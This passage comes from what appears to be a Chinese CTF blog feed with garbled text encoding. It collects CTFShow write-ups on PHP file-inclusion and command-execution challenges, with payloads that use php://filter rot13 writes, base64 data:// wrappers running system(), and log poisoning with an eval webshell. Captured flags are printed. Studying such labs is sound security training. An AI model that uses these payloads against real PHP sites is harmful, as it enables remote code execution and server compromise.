class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    file_put_contents(urldecode(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;å¤§ä½¬åˆ«ç§€äº†&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ</strong>ï¼š</p>
<ol>
<li>ä¾æ—§å°† php, data, : , . æ›¿æ¢ä¸ºäº† ???</li>
<li>GETä¸€ä¸ª file, POSTä¸€ä¸ª content, </li>
<li>urldecode($fie) å°†GETåˆ°çš„file URLè§£ç ï¼Œæ—¢ç„¶ä¸€å¼€å§‹å°±è¦è§£ç é‚£ä¹ˆåœ¨å°†fileä¼ å…¥æ—¶å°±å¾—URLç¼–ç ä¸€æ¬¡ï¼Œç„¶è€Œå››ä¸ªstr_replace()ä¼šå°†å…¶å†…å®¹æ›¿æ¢ï¼Œé‚£ä¹ˆå®³å¾— URLç¼–ç ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¸€å…±éœ€è¦ URLç¼–ç ä¸¤æ¬¡ã€‚ï¼ˆFull URL Encodeï¼‰</li>
<li>â€œ<?php die('å¤§ä½¬åˆ«ç§€äº†');?>â€œ.$content . POSTä¼ å…¥çš„contentå°†å’Œå‰é¢è¿™å¥phpæ‹¼æ¥åœ¨ä¸€èµ·ã€‚å½“æ­£å¸¸æ‰§è¡Œçš„æ—¶å€™ï¼Œé¦–å…ˆæ‰§è¡Œ die(â€˜å¤§ä½¬åˆ«ç§€äº†â€™) è¿™ä¸ªdie()å°†ä¼šç»“æŸç¨‹åºçš„æ‰§è¡Œï¼Œé‚£ä¹ˆæˆ‘POSTä¼ å…¥çš„å†…å®¹æœªè¢«æ‰§è¡Œï¼Œå› æ­¤éœ€è¦æƒ³åŠæ³•ç»•è¿‡è¿™ä¸ª die() ä¸ç„¶æˆ‘å°±ç‹—å¸¦äº†ã€‚ä½¿ç”¨ç¼–ç ç»•è¿‡æ¯”å¦‚ å°† contentæŒ‰ç…§æŸä¸ªç¼–ç è¿›è¡Œç¼–ç ã€‚é‚£ä¹ˆç¨‹åºåœ¨æ‰§è¡Œæ—¶ä¼šå…ˆè¿›è¡Œè§£ç ã€‚æˆ‘ä»¬ç¼–ç çš„å†…å®¹å½“ç„¶èƒ½æ­£å¸¸è§£ç ï¼Œè€Œå‰é¢de die()å¹¶ä¸æ˜¯æŸä¸ªç¼–ç æ‰€ä»¥å¯¹die()è¿›è¡Œè§£ç å°±ä¼šå˜æˆä¹±ç æˆ–å…¶ä»–ï¼Œphpå°†ä¸èƒ½è®¤å‡ºdie()å°±ä¸ä¼šæ‰§è¡Œdie()è¿™æ ·å°±ç»•è¿‡äº†die()ã€‚åé¢çš„contentä»ç„¶ä¼šæ‰§è¡ŒæˆåŠŸã€‚</li>
</ol>
<p><strong>è¯•éªŒ:</strong></p>
<ol>
<li>php://filter/write=string.rot13/resource=2.php è¿™å¥è¯çš„æ„æ€æ˜¯ å°†2.php æŒ‰ç…§ rot13ç¼–ç å†™å…¥åˆ°ç›®å½•ä¸­å»; Full URL Encode ä¸¤æ¬¡</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">41</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">36</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">43</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">39</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">37</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">34</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">31</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">46</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">33</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">35</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">44</span>%<span class="number">25</span>%<span class="number">33</span>%<span class="number">32</span>%<span class="number">25</span>%<span class="number">32</span>%<span class="number">45</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span>%<span class="number">25</span>%<span class="number">36</span>%<span class="number">38</span>%<span class="number">25</span>%<span class="number">37</span>%<span class="number">30</span></span><br></pre></td></tr></table></figure>

<pre><code> 2. content = &lt;?php system(&#39;tac f*&#39;);?&gt; è¿›è¡Œ rot13ç¼–ç :
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">content=<span class="meta">&lt;?</span>cuc flfgrz(<span class="string">&quot;gnp s*.cuc&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87.png"></p>
<pre><code>3. å¦‚ä¸Šå›¾æ‰§è¡Œ
4. è®¿é—® 2.php é¡µé¢
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web87_1.png"></p>
<h2 id="web88â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web88â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web88â€”â€”æ–‡ä»¶åŒ…å«"></a>web88â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-17 02:27:25</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;</span>, <span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æ:</strong></p>
<ol>
<li>æ­£åˆ™è¡¨è¾¾æ˜¯ åŒ¹é…äº† ä¸€å¤§å †ä¸œè¥¿:</li>
<li>php , ~, ! , @, #, $, %, ^, &amp;, *, ( ), -, _, +, = .  æŠŠé”®ç›˜æ•°å­—å“ªä¸€è¡Œéƒ½è¿‡æ»¤äº†</li>
</ol>
<p><strong>å®éªŒï¼š</strong></p>
<ol>
<li>ä½¿ç”¨ data:// åè®®</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4</span></span><br><span class="line"><span class="comment">//<span class="meta">&lt;?php</span> system(&#x27;tac f*.php&#x27;);<span class="meta">?&gt;</span> çš„ base64 ç¼–ç ä¸ºPD9waHAgc3lzdGVtKCd0YWMgZioucGhwJyk7Pz4= </span></span><br><span class="line"><span class="comment">// å› ä¸º é¢˜ç›®è¿‡æ»¤äº† = ï¼ˆç­‰å·ï¼‰ æ‰€ä»¥åœ¨ä½¿ç”¨æ—¶ åˆ æ‰</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web88.png"></p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow Webç¬”è®°</title>
    <url>/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="ctfshow-å‘½ä»¤æ‰§è¡Œç¬”è®°"><a href="#ctfshow-å‘½ä»¤æ‰§è¡Œç¬”è®°" class="headerlink" title="ctfshow å‘½ä»¤æ‰§è¡Œç¬”è®°"></a>ctfshow å‘½ä»¤æ‰§è¡Œç¬”è®°</h1><h2 id="web34â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web34â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web34â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web34â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<span id="more"></span>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ï¼šflag, system, php, cat, sort, shell, å°æ•°ç‚¹, ç©ºæ ¼, å•å¼•å·ï¼Œåå¼•å·ï¼Œecho, åˆ†å·ï¼Œå·¦æ‹¬å·ï¼Œå†’å·ï¼ŒåŒå¼•å·ï¼›<br>æ­¤é¢˜åŒä¸Šä¸€é¢˜ç±»ä¼¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web34.png"></p>
<p>base64è§£ç å³å¯å¾—åˆ°flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 00:49:26</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;176e1aa8-38eb-48f9-a1a9-07a5ea683dd3&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ctfshow{176e1aa8-38eb-48f9-a1a9-07a5ea683dd3}</p>
<h2 id="web35â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web35â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web35â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web35â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ä¸€å¤§å †ç©æ„å„¿ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web35.png"></p>
<p>ä¸web34,33ç±»ä¼¼base64è§£ç å³å¯è·å¾—flag:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 03:37:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;cddf1bd1-a9c1-4ef6-bb94-50d55091a10e&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ctfshow{cddf1bd1-a9c1-4ef6-bb94-50d55091a10e}</p>
<h2 id="web36â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web36â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web36â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web36â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†ï¼š flag,system,php,cat,sort,shell, å°æ•°ç‚¹ï¼Œå•å¼•å·ï¼Œåå¼•å·ï¼Œecho,åˆ†å·ï¼Œå·¦æ‹¬å·,å†’å·ï¼ŒåŒå¼•å·ï¼Œå·¦å°–æ‹¬å·ï¼Œç­‰å·ï¼Œæ•°å­—0-9ï¼›</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="keyword">include</span><span class="variable">$_GET</span>[x]<span class="meta">?&gt;</span>&amp;x=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<p>åŒä¸Šä¸€é¢˜:</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web36.png"></p>
<p>base64è§£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>: 2020-09-04 00:49:19</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by: h1xa</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-04 03:37:11</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;375f8cad-2ba6-4f1f-8d69-bbd592bd1b1c&#125;&quot;</span>;&lt;br/&gt;</span><br></pre></td></tr></table></figure>

<p>ctfshow{375f8cad-2ba6-4f1f-8d69-bbd592bd1b1c}</p>
<h2 id="web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"><a href="#web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell" class="headerlink" title="web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"></a>web37â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ ¹æ®ç™¾åº¦å¾—çŸ¥æ­¤é¢˜ä½¿ç”¨ ï¼š<br><strong>data://åè®®</strong>ï¼š<br><strong>æ¡ä»¶</strong>ï¼šallow_url_fopen:On allow_url_include:On<br><strong>ç”¨å¤„</strong>: phpç‰ˆæœ¬&gt;=5.2.0å¯ä»¥ä½¿ç”¨data://æ•°æ®å°è£…å™¨ï¼Œä»¥ä¼ é€’ç›¸åº”æ ¼å¼çš„æ•°æ®ç”¨æ¥æ‰§è¡ŒPHPä»£ç :<br><strong>ç”¨æ³•</strong>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">data:<span class="comment">//text/plain; å‘½ä»¤</span></span><br><span class="line">data:<span class="comment">//text/plain;base64, base64ç¼–ç </span></span><br></pre></td></tr></table></figure>

<p>åœ¨æ­¤é¢˜å½“ä¸­å°è¯•ä½¿ç”¨:<br><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain,<span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span> = base64 = PD9waHAgc3lzdGVtKCdscycpOz8+</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web37.png"></p>
<p>å› ä¸ºé¢˜ç›®ä¸­è¿‡æ»¤äº† flag,æ‰€ä»¥<?php system('tac flag.php');?>å°†å¤±æ•ˆ,</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web37_1.png"></p>
<p>å¦‚å›¾å¾—åˆ°äº†flag<br><strong>æ–¹æ³•äºŒ:</strong><br>åˆ©ç”¨æ—¥å¿—:</p>
<ol>
<li>é¦–å…ˆåœ¨urlä¸­è®¿é—®ä¸å­˜åœ¨å†…å®¹ï¼Œè®©å…¶è®°å½•åˆ°æœåŠ¡å™¨çš„æ—¥å¿—æ–‡ä»¶ä¸­,æ­¤æ¬¡é¢˜ç›®ç¯å¢ƒçš„æ—¥å¿—è·¯å¾„ä¸º:<br>/var/log/nginx/access.log</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>â€‹    2.æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ä¸­æ˜¯å¦å¤šäº† ä¸€å¥è¯æœ¨é©¬:</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web37_2.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºå‘ç°å‘ç”Ÿäº†è½¬ç : ç©ºæ ¼: %20; &lt;:%3C; &gt;:%3E; [:%5B; ]:%5D; â€™ : %27</p>
<p>â€‹    3.èšå‰‘ or èœåˆ€ ç±»ä¼¼å·¥å…·è¿æ¥: but è¿æ¥å¤±è´¥</p>
<h2 id="web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"><a href="#web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell" class="headerlink" title="web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell"></a>web38â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|php|file/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼š</strong><br>ä¸ä¸Šä¸€é¢˜éƒ½ä½¿ç”¨ dataåè®®:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOz8+</span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;ls&#x27;);<span class="meta">?&gt;</span> = base64 = PD9waHAgc3lzdGVtKCdscycpOz8+</span></span><br></pre></td></tr></table></figure>

<p>å°†å¾—åˆ°ç›®å½•ä¸‹çš„æ–‡ä»¶å¦‚å›¾:</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web38.png"></p>
